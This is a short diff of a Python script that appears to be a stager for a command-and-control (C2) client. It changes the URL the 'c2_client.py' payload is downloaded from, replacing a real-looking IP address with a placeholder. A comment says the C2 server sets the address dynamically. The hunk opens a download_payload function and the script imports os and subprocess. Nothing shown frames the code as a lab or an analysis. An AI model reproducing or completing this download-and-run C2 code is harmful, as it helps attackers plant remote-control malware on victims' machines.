@@ -3,7 +3,7 @@ import os
 import subprocess
 
 # URL to download the c2_client.py payload
-PAYLOAD_URL = 'http://13.41.65.77/c2_client.py'  # Ensure this is correct
+PAYLOAD_URL = 'http://1.1.1.1/c2_client.py'  # Ensure you leave this as c2_server sets it dynamically
 PAYLOAD_FILENAME = 'c2_client.py'
 
 def download_payload(url, filename):
